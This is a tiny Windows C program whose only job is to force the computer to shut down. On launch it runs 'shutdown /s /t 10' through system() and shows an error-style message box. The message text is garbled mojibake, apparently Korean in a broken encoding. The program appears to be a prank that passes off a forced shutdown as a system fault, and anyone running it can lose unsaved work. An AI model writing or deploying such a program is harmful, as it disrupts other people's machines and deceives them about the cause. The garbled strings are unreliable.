#include "framework.h"

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdParam, int nCmdShow) {
	system("shutdown /s /t 10");
	MessageBoxW(NULL, L"��ǻ�Ͱ� ������� ���� ���� �����߽��ϴ�.\n������� ��ǻ�͸� 10���Ŀ� �����մϴ�.", L"�� PC", MB_OK | MB_ICONERROR);
	return 0;
}